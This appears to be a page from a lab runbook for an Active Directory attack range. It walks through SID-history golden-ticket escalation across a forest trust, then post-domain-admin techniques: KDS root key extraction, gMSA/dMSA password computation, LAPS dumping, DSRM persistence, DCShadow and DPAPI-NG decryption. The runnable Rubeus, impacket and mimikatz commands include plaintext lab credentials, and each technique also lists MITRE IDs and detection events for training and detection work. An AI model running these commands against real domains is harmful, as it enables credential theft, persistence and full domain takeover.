# CAMPAIGNS v3 — Phase 7 — Forest Trust Escalation (SID History)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 7 — Forest Trust Escalation (SID History — WT010-012)


|                   |                                                   |
| ----------------- | ------------------------------------------------- |
| **Target**        | dc01 (.10) — root domain via parent-child trust   |
| **From**          | **mbr01** (using child krbtgt captured in Phase 6) |
| **Starting cred** | Child krbtgt + child DA (from Phase 6)            |
| **What you earn** | **Enterprise Admin** in cadre.local → root krbtgt |
| **MITRE**         | T1550.002 (Use Alternate Auth Mat: Kerberos) + T1134.005 (SID-History Injection) |


**Status:** ⚠️ Bypassed in current run. Phase 7 as-written requires child `krbtgt` from Phase 6. Instead, WT031 password-spray fallback yielded `chief_command` (DA+EA in `cadre.local`), and root `krbtgt` was DCSync'd directly from `dc01`. The EA objective is already satisfied.

**Phase 7 remains valid** for a clean main-spine run after Phase 6 is unblocked.

**Step 1 — Get root EA SID from mbr01 using child DA hash:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe lookupid /user:Administrator /domain:cadre.local /dc:192.168.77.10"
```

**Step 2 — Forge Golden Ticket on mbr01 with Rubeus:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe golden /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-2616196951-1941128886-767624593 /rc4:<child_krbtgt_ntlm> /sids:S-1-5-21-<root>-519 /ptt"
```

**Step 3 — Use the ticket from mbr01 to access dc01:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "dir \\dc01.cadre.local\C$"
```

**Fallback from Kali:**

```bash
# Get root EA SID
impacket-lookupsid -hashes :<child_admin_nthash> cadre.local/Administrator@192.168.77.10
# Forge ticket with EA SID
impacket-ticketer -nthash <child_krbtgt_hash> -domain child.cadre.local \
  -domain-sid <child_sid> -extra-sid <root_EA_SID> Administrator
# Authenticate to dc01 as EA
impacket-psexec cadre.local/Administrator@192.168.77.10 -k -no-pass
```

**Stealth alternative — Diamond Ticket (WT012):** Modify a legitimate TGT instead of forging one.

**Targeted alternative — Silver Ticket (WT011):** Forge service-specific TGS for targeted access without DC contact.

#### G — Persistence (Inline)


| G WT# | Technique                    | Detection        |
| ----- | ---------------------------- | ---------------- |
| 088   | Scheduled Task (T1053.005)   | WinSec 4698      |
| 089   | Registry Run Key (T1547.001) | Sysmon EID 12-13 |


### Post-DA Sub-Phase — KDS Root Key & gMSA/dMSA Cluster (WT097-103) 🆕

> **Place in flow:** after Phase 7 (root EA / krbtgt in hand) — runs with **Domain Admin** on `cadre.local` (and `range.local` where noted). This cluster abuses the **Key Distribution Service (KDS) Root Key** + **DPAPI-NG SID protectors** — the same mechanism family as gMSA/dMSA/DPAPI-NG. All items are post-exploitation primitives: they persist, harvest, or compute credentials *after* DA is achieved. **Detection is host-side only** (no network signature) — the telemetry burden is on LSA-secret access / DPAPI blob reads. Adopted 2026-08-02 from `Campaign_suggestions.md` upgrade candidates.
>
> **Prerequisite chain:** KDS Root Key (WT097) → enables Golden gMSA (WT098) / Golden dMSA (WT099) / DPAPI-NG decryption (WT103). LAPS bulk (WT100), DSRM (WT101), DCShadow (WT102) are independent DA primitives.
>
> **Validated 2026-08-03:** WT097 ✅ (2 root-key blobs) · WT098 ✅ (prereqs: key + SID + pwdid) · WT101 ✅ (DSRM hash + logon-behavior gate) · WT100 🔬 (LAPS **not implemented** — future) · WT102 ⛔ (dcshadow env-blocked) · WT099/103 ⏳ (need range.local / DPAPI-NG target). **Rule 3:** extraction + prerequisites = verified; password computation / mutating steps = user practice.
>
> **Source:** Grafnetter TROOPERS26 (KDS/DPAPI-NG) + SpecterOps; `Campaign_suggestions.md` Post-DA items (#84-89).

#### WT097 — KDS Root Key Extraction ✅

**MITRE:** T1552 (Unsecured Credentials)
**Prerequisite:** DA on `cadre.local` (e.g., `chief_command`).

The KDS Root Key (`KdsRootKey` in `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=cadre,DC=local`) is the master secret that derives all group-managed (gMSA) / delegated-managed (dMSA) account passwords and DPAPI-NG protector keys. Extracting it makes every gMSA/dMSA password computable offline.

```powershell
# From mbr01 or ws01 with DA (DSInternals)
Get-ADObject "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=cadre,DC=local" -Properties msKds-RootKeyData
# Or via DSInternals (live):
Get-KdsRootKey -Credential (Get-Credential cadre\chief_command) -Domain cadre.local
# LSA backup key (DPAPI): mimikatz lsadump::backupkeys
```

**Detection:** LSA secret access (`lsadump::backupkeys`), LDAP read of `msKds-RootKeyData` (WinSec 4662). No network signature.

**Cross-refs:** `Campaign_suggestions.md` Post-DA #84; prerequisite for WT098/099/103.

#### WT098 — Golden gMSA Attack ✅ (prereqs)

**MITRE:** T1558 (Steal or Forge Kerberos Tickets) / T1552
**Prerequisite:** WT097 (KDS root key) + `msDS-ManagedPassword` blob (Branch A ACE#10 already verified: `eng_cloud` reads `gmsaTools$`).

Compute any gMSA account's password **offline** from the KDS root key + its managed-password blob — no network, no LSA, no Kerberos. Target: `gmsaTools$` (already readable via ACE#10).

```powershell
# DSInternals — offline gMSA password computation
$blob = Get-ADObject 'CN=gmsaTools,CN=Managed Service Accounts,...' -Properties msDS-ManagedPassword
ConvertFrom-ManagedPasswordBlob -Blob $blob.msDS-ManagedPassword -KdsRootKey $rootKey
# → plaintext gMSA password → SMB/Kerberos auth as gmsaTools$
# Alt: gMSADumper (Python)
gmsadumper.py -u eng_cloud -p 'Cl0ud_Eng!' -d cadre.local -l dc01.cadre.local
```

**Why in campaign:** extends the verified ACE#10 read (WT024) into full account takeover without touching LSA — fully offline (no DC logs beyond the original ACE#10 read).

**Detection:** LDAP read of `msDS-ManagedPassword` (already required); no additional network signal.

**Cross-refs:** Branch A ACE#10 (verified WT024), `Campaign_suggestions` Post-DA #85.

#### WT099 — Golden dMSA / BadSuccessor (Server 2025)

**MITRE:** T1558 / T1552
**Prerequisite:** WT097 + delegated-managed account in `range.local` — `dmsaPrivService$` (Branch A ACE#24: `adversary_lead` → `dmsaPrivService$` GenericWrite).

Server 2025 introduces **delegated Managed Service Accounts (dMSA)**; the **BadSuccessor** technique computes a dMSA password offline from the KDS root key (Golden dMSA), and **BetterSuccessor** is the post-patch variant. Target: `dmsaPrivService$` in `range.local` (DA via `svc_naa` / WT034, or `adversary_lead` ACE#24).

```powershell
# DSInternals offline computation against the range.local KDS root key
Get-KdsRootKey -Domain range.local -Credential ...
ConvertFrom-DelegatedManagedPasswordBlob -Blob ... -KdsRootKey ...
# BadSuccessor / BetterSuccessor tooling (Server 2025)
```

**Why in campaign:** Server 2025-only attack class with zero current coverage; ties to the range.local ACE#24 surface.

**Detection:** KDS root key read + dMSA blob read (4662). No network signature.

**Cross-refs:** Branch A ACE#24, `Campaign_suggestions` Post-DA #88.

#### WT100 — LAPS Bulk Extraction 🔬 (not implemented)

**MITRE:** T1552.004 (Unsecured Credentials: Private Keys)
**Prerequisite:** DA; mbr01 has LAPS configured (`04-vulnerabilities.yml`).

Bulk-read every machine's `ms-Mcs-AdmPwd` (or Windows LAPS `msLAPS-Password`) via LDAP — gives local admin on all LAPS-managed machines. Extends the existing 3.5L (single-target LAPS) to domain-wide.

```bash
# Via NetExec (DA):
nxc ldap 192.168.77.10 -u chief_command -p 'C0mm@nd_Ch1ef!' --laps --kdcHost 192.168.77.10
# Or LDAP filter:
ldapsearch -x -H ldap://dc01.cadre.local -b "DC=cadre,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
```

**Detection:** WinSec 4662 on `ms-Mcs-AdmPwd` attribute reads (bulk pattern = high signal).

**Cross-refs:** Phase 3.5 `3.5L`, `Campaign_suggestions` Post-DA #87.

#### WT101 — DSRM Password Extract & Set ✅ (extraction)

**MITRE:** T1098.001 (Account Manipulation) / T1003
**Prerequisite:** DA on a DC (dc01).

Extract the Directory Services Restore Mode (DSRM) password hash (local SAM on the DC) and use it to persist or authenticate (DSRM logon, `sekurlsa::pth /domain:dc01` after registry `DsrmAdminLogonBehavior=2`).

```powershell
# On dc01 as SYSTEM/DA (mimikatz):
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
# → DSRM NTLM hash (Administrator local SAM entry on DC)
# Enable DSRM logon for remote auth:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
# Set a NEW DSRM password (persistence):
ntdsutil "set dsrm password" "reset password on server null" q q
```

**Why in campaign:** DC-local persistence that survives krbtgt rotation; distinct from ticket forgery.

**Detection:** local SAM access on DC (WinSec 4663/4688), registry change `DsrmAdminLogonBehavior`.

**Cross-refs:** `Campaign_suggestions` Post-DA #86.

#### WT102 — DCShadow ⛔ (env-blocked)

**MITRE:** T1098 (Account Manipulation) / T1550.002
**Prerequisite:** DA + DRS rights (replication) — held since Phase 6.

Push malicious object attributes (SID history, SPN, group membership, `adminCount`) directly into AD via the DRS replication protocol from a **non-DC** host — the inverse of DCSync. Gives a stealthy, credential-free persistence/injection primitive.

```bash
# mimikatz on a DA host (dcshadow):
mimikatz.exe "privilege::debug" "lsadump::dcshadow /object:chief_backup /attribute:servicePrincipalName /value:HTTP/dc01.cadre.local" "lsadump::dcshadow /push"
# Or krbrelayx dcshadow
```

**Why in campaign:** complements Phase 7 ticket forgery with a DRS-level injection path; registers no normal object-modification events (replication is the legitimate channel).

**Detection:** WinSec 4662 replication operations from a non-DC source; Zeek DCE-RPC `drsuapi` replication from non-DC.

**Cross-refs:** Phase 6 DCSync (WT009, verified — inverse), `Campaign_suggestions` DCShadow.

#### WT103 — DPAPI-NG SID Protector Decryption

**MITRE:** T1555 (Credentials from Password Stores)
**Prerequisite:** WT097 (KDS root key) + DPAPI-NG protected blob.

DPAPI-NG protects secrets (BitLocker recovery, PFX, DNSSEC keys, ASP.NET) with a **SID protector** derived from the KDS root key. With the root key, decrypt any SID-protected blob offline.

```bash
# DSInternals / custom: decrypt DPAPI-NG SID-protected blob with KDS root key
# Targets: BitLocker recovery keys, PFX certs, DNSSEC zone keys, ASP.NET MachineKey
```

**Why in campaign:** the post-DA capstone — turns the KDS extraction into concrete secret recovery across 4+ protected store types.

**Detection:** DPAPI-NG blob reads (4663), no network signature.

**Cross-refs:** `Campaign_suggestions` Post-DA #89 (BitLocker/PFX/DNSSEC/ASP.NET variants).

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-6.md`](CAMPAIGNS-RUNBOOK-6.md) · Next: [`CAMPAIGNS-RUNBOOK-8.md`](CAMPAIGNS-RUNBOOK-8.md) →
